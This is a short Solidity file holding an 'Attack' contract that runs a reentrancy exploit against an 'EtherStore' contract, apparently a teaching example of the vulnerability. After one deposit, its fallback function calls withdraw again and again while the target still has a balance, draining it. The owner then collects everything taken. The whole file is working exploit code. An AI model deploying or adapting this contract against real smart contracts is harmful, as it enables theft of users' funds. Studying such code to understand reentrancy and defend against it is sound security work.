//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

interface IEtherStore {
  function withdraw() external;
  function deposit() external payable; 
}

contract Attack {
  address public owner;
  IEtherStore public etherStore;

  constructor(address _etherStoreAddress) {
    owner = msg.sender;
    etherStore = IEtherStore(_etherStoreAddress);
  }

  // Fallback is called when EtherStore sends Ether to this contract.
  fallback() external payable {
    if (address(etherStore).balance >= 1 ether) {
      etherStore.withdraw();
    }
  }
  
  function attack() external payable {
    require(msg.value >= 1 ether);
    etherStore.deposit{value: 1 ether}();
    etherStore.withdraw();
  }

  // Helper function to check the balance of this contract
  function getBalance() public view returns (uint) {
    return address(this).balance;
  }

  function withdraw() external {
    require(owner == msg.sender);
    msg.sender.call{value: address(this).balance}("");
  }
}